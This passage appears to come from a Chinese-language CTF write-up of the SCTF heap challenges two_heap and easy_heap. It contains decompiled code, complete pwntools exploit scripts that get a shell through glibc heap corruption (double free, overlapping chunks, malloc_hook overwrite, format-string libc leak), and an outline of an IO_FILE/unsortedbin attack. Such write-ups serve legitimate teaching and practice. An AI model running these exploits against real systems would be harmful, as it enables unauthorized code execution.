class="string">constraints:</span></span><br><span class="line"><span class="string">  [[rbp-0x88]] == NULL || [rbp-0x88] == NULL</span></span><br><span class="line"><span class="string">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe585f execve("/bin/sh", r10, [rbp-0x70])</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r10] == NULL || r10 == NULL</span></span><br><span class="line"><span class="string">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe5863 execve("/bin/sh", r10, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r10] == NULL || r10 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a38c execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a398 execve("/bin/sh", rsi, [rax])</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [[rax]] == NULL || [rax] == NULL</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
<h1 id="two-heap"><a href="#two-heap" class="headerlink" title="two_heap"></a>two_heap</h1><p>这道题目17大佬使用了神奇的%a，直接泄露libc了。</p>
<h2 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h2><p>题目依然没有show函数，需要泄露libc，这次没有限制free的次数，根据索引释放chunk，可以double free，libc也是2.27。</p>
<p>在add函数中，题目对输入的size进行了&amp;0xFFFFFFF8的操作，然后对计算之后的size进行检查，如果size已经存在过，就不允许再申请同样size的chunk了，这就导致某个大小的chunk只能申请2次，比如申请0x90的chunk，与运算完成后只能是0x80或0x88，但是构造double free需要4次。但是因为有最小chunk的限制为0x20，我们输入0x0、0x8、0x10和0x18的申请到的都是0x20的chunk。因此可以在0x20的chunk上构造double free。</p>
<p>题目还有明显的栈溢出和格式化字符串的漏洞，但是栈溢出没什么用，溢出3字节到v5，但是v5没用到，后面printf会输出v4，加了格式化字符串的检查。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall __<span class="function">noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+1Ch] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+24h] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_12D0();</span><br><span class="line">  v4 = <span class="number">0L</span>L;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to SCTF:"</span>);</span><br><span class="line">  my_read(&amp;v4, <span class="number">11</span>);</span><br><span class="line">  __printf_chk(<span class="number">1L</span>L, &amp;v4, <span class="number">0xFFFFFFFF</span>LL, <span class="number">0xFFFFFFFF</span>LL, <span class="number">0xFFFFFFFF</span>LL);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = sub_1440();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      add();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"exit."</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">delete</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="利用过程-1"><a href="#利用过程-1" class="headerlink" title="利用过程"></a>利用过程</h2><p>这里利用过程使用了%a%2$a%3$a泄露libc，虽然不知奥原因是什么。然后构造double free来修改malloc_hook为one_gadget。<br>程序一开始不能运行，用了上次用过的强行修改libc的脚本，脚本来源见参考，这个脚本实在是太方便了，再次感谢写脚本的大佬。<br>一直找不到ld.so文件，最后是在ubuntu 17.10安装过程中有一个try ubuntu的选项，然后试用将ld.so文件拷贝出来的…<br>完整exp如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.terminal = [<span class="string">"tmux"</span>,<span class="string">"split"</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_ld</span><span class="params">(binary, ld)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Force to use assigned new ld.so by changing the binary</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.access(ld, os.R_OK): </span><br><span class="line">        log.failure(<span class="string">"Invalid path &#123;&#125; to ld"</span>.format(ld))</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line"> </span><br><span class="line">         </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> isinstance(binary, ELF):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.access(binary, os.R_OK): </span><br><span class="line">            log.failure(<span class="string">"Invalid path &#123;&#125; to binary"</span>.format(binary))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">        binary = ELF(binary)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> segment <span class="keyword">in</span> binary.segments:</span><br><span class="line">        <span class="keyword">if</span> segment.header[<span class="string">'p_type'</span>] == <span class="string">'PT_INTERP'</span>:</span><br><span class="line">            size = segment.header[<span class="string">'p_memsz'</span>]</span><br><span class="line">            addr = segment.header[<span class="string">'p_paddr'</span>]</span><br><span class="line">            data = segment.data()</span><br><span class="line">            <span class="keyword">if</span> size &lt;= len(ld):</span><br><span class="line">                log.failure(<span class="string">"Failed to change PT_INTERP from &#123;&#125; to &#123;&#125;"</span>.format(data, ld))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">            binary.write(addr, ld.ljust(size, <span class="string">'\0'</span>))</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.access(<span class="string">'/tmp/pwn'</span>, os.F_OK): os.mkdir(<span class="string">'/tmp/pwn'</span>)</span><br><span class="line">            path = <span class="string">'/tmp/pwn/&#123;&#125;_debug'</span>.format(os.path.basename(binary.path))</span><br><span class="line">            <span class="keyword">if</span> os.access(path, os.F_OK): </span><br><span class="line">                os.remove(path)</span><br><span class="line">                info(<span class="string">"Removing exist file &#123;&#125;"</span>.format(path))</span><br><span class="line">            binary.save(path)    </span><br><span class="line">            os.chmod(path, <span class="number">0b111000000</span>) <span class="comment">#rwx------</span></span><br><span class="line">    success(<span class="string">"PT_INTERP has changed from &#123;&#125; to &#123;&#125;. Using temp file &#123;&#125;"</span>.format(data, ld, path)) </span><br><span class="line">    <span class="keyword">return</span> ELF(path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    elf = change_ld(<span class="string">'./two_heap'</span>, <span class="string">'./ld-linux-x86-64.so.2'</span>)</span><br><span class="line">    p = elf.process(env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc-2.26.so'</span>&#125;)</span><br><span class="line">    libc = ELF(<span class="string">"./libc-2.26.so"</span>)</span><br><span class="line">    <span class="comment">#p = process("./two_heap")</span></span><br><span class="line">    <span class="comment">#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">"47.104.89.129"</span>,<span class="number">10002</span>)</span><br><span class="line">    libc = ELF(<span class="string">"./libc-2.26.so"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Input the size:"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"Input the note:"</span>)</span><br><span class="line">    p.send(data)</span><br><span class="line">    <span class="comment">#sleep(2)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Input the index:"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##leak libc</span></span><br><span class="line">p.recvuntil(<span class="string">"Welcome to SCTF:"</span>)</span><br><span class="line">p.sendline(<span class="string">"%a%2$a%3$a"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"."</span>)</span><br><span class="line">leak_addr = int(<span class="string">'0x'</span> + p.recvn(<span class="number">12</span>)+<span class="string">'0'</span>,<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(leak_addr)</span><br><span class="line">libc_base = leak_addr - (<span class="number">0x7ffff7fee720</span><span class="number">-0x00007ffff7e3f000</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base:"</span>,hex(libc_base)</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.symbols[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0xe361b</span></span><br><span class="line">realloc_hook = libc_base + libc.symbols[<span class="string">"__realloc_hook"</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">'\n'</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0x10</span>,p64(malloc_hook)+<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">0x7</span>,<span class="string">''</span>)</span><br><span class="line">add(<span class="number">0x18</span>,p64(one_gadget)+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line"><span class="comment">##trigger</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Input the size:"</span>)</span><br><span class="line">p.sendline(<span class="string">'96'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x45e0a execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x45e5e execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe361b execve("/bin/sh", rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string">ubuntu@ubuntu:~/Documents/SCTF/two_heap$ one_gadget ./libc-2.26.so</span></span><br><span class="line"><span class="string">0x45e0a execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x45e5e execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe361b execve("/bin/sh", rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure></p>
<h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><p>看了官方的exp，预期解是libc2.26的负数溢出漏洞，使得size在[-0x10,0]时也可以申请到0x20的chunk，但是出题人忘了0x8也可以，所以不知道这个漏洞也可以申请4次0x20的chunk(0x0,0x8,0x10,0x18)。<br>看了官方exp发现还有一个泄露libc的格式化字符串，那目前有两个格式化字符串：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0</span>p+<span class="number">00</span>x0p+<span class="number">00</span>x0<span class="number">.0</span></span><br><span class="line">%a%<span class="number">2</span>$a%<span class="number">3</span>$a</span><br></pre></td></tr></table></figure></p>
<h1 id="easy-heap"><a href="#easy-heap" class="headerlink" title="easy_heap"></a>easy_heap</h1><p>这道题目和姚老板在TSCTF2019初赛的babyheap重合了，唯一的区别是这道题目add和edit是分离的，稍微修改脚本可以直接用。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.terminal = [<span class="string">"tmux"</span>,<span class="string">"split"</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">   p = process(<span class="string">"./easy_heap"</span>)</span><br><span class="line">   libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   p = remote(<span class="string">"132.232.100.67"</span>,<span class="number">10004</span>)</span><br><span class="line">   libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">   p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">   p.sendline(<span class="string">'1'</span>)</span><br><span class="line">   p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">   p.sendline(str(size))</span><br><span class="line">   <span class="comment">#p.recvuntil("Address ")</span></span><br><span class="line">   <span class="comment">#heap_ptr = int(p.recvuntil("\n",drop=True),16)</span></span><br><span class="line">   <span class="comment">#print hex(heap_ptr)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span> </span><br><span class="line">   p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">   p.sendline(<span class="string">'2'</span>)</span><br><span class="line">   p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">   p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,data)</span>:</span></span><br><span class="line">   p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">   p.sendline(<span class="string">'3'</span>)</span><br><span class="line">   p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">   p.sendline(str(idx))</span><br><span class="line">   p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">   p.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Mmap: "</span>)</span><br><span class="line">mmap_addr = int(p.recvuntil(<span class="string">'\n'</span>,drop=<span class="keyword">True</span>),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(mmap_addr)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x30</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0xf0</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x20</span>) <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">'2'</span>*<span class="number">0x60</span>+p64(<span class="number">0x140</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x50</span>) <span class="comment">#3 0x60</span></span><br><span class="line">add(<span class="number">0x40</span>) <span class="comment">#5 0x50</span></span><br><span class="line">add(<span class="number">0xf0</span>) <span class="comment">#6 0x100</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">0x48</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="string">'a'</span>*<span class="number">0x40</span>+p64(<span class="number">0xf0</span>+<span class="number">0x50</span>)) <span class="comment">#5 idx6:prev_size:0x140,size:0x100</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">6</span>) <span class="comment">#free into unsortedbin 0x100+0x140 idx0~idx3+idx5~idx6</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>) <span class="comment">#free into fastbin 0x70</span></span><br><span class="line">add(<span class="number">0xc0</span>) <span class="comment">#0 unsortedbin addr the same as fastbin 0x70</span></span><br><span class="line">add(<span class="number">0x20</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0xf0</span>) <span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x30</span>) <span class="comment">#7</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>) <span class="comment">#0x60 free into fastbin 0x60</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x30</span> + p64(<span class="number">0</span>) +p64(<span class="number">0x71</span>) + <span class="string">'\xdd\x25'</span> + <span class="string">'\n'</span></span><br><span class="line">add(<span class="number">0x50</span>)</span><br><span class="line">edit(<span class="number">3</span>,payload) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">edit(<span class="number">9</span>,<span class="string">'a'</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span>+<span class="string">'\n'</span>) <span class="comment">#9 stdout</span></span><br><span class="line">p.recvuntil(<span class="string">"\x00\x18\xad\xfb"</span>)</span><br><span class="line">p.recvn(<span class="number">28</span>)</span><br><span class="line">leak_addr = u64(p.recvn(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base = leak_addr - (<span class="number">0x7ffff7dd2600</span><span class="number">-0x7ffff7a0d000</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base:"</span>,hex(libc_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#10</span></span><br><span class="line">add(<span class="number">0xf0</span>) <span class="comment">#11</span></span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">10</span>,<span class="string">'a'</span>*<span class="number">0x10</span>+p64(<span class="number">0x60</span>)) <span class="comment">#10 prev_size:0x60 idx4(0x40)+idx10(0x20)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.symbols[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0xf02a4</span></span><br><span class="line">delete(<span class="number">8</span>) <span class="comment">#0x70</span></span><br><span class="line">delete(<span class="number">3</span>) <span class="comment">#0x60</span></span><br><span class="line">add(<span class="number">0x50</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(<span class="number">0</span>)*<span class="number">6</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+p64(malloc_hook<span class="number">-0x23</span>)+<span class="string">'\n'</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">12</span>,<span class="string">'a'</span>*<span class="number">0x13</span>+p64(one_gadget)+<span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line"><span class="comment">##trigger malloc_printerr</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">8</span>) <span class="comment">#double free</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
<h2 id="预期解-1"><a href="#预期解-1" class="headerlink" title="预期解"></a>预期解</h2><p>参考官方wp，利用思路如下：</p>
<ol>
<li>首先构造unlink获得在bss段上的heap_list的写权限，这里unlink的是idx0。</li>
<li>编辑idx0在idx1上写入mmap_addr，编辑idx1在mmap_addr上写入shellcode。</li>
<li>申请idx3(从unsortedbin中)，通过edit idx0修改idx2的heap_ptr为unsortedbin size的地址(低字节修改)，编辑idx3修改unsortedbin的大小为0x61。</li>
<li>通过edit idx0修改idx2的heap_ptr为unsortedbin bk的地址(低字节修改)，编辑idx3修改unsortedbin的bk为_IO_list_all-0x10。</li>
<li>在unsortedbin的chunk处伪造IO_FILE结构，构造虚表指针为heap_list+0x10。</li>
<li>在heap_list+0x10处伪造函数跳转表，修改跳转地址为mmap_addr。</li>
<li>申请chunk触发unsortedbin attack，程序报错触发_IO_flush_all_lockp，最终跳转到mmap_addr执行shellcode，读取flag文件并输出其内容。</li>
</ol>
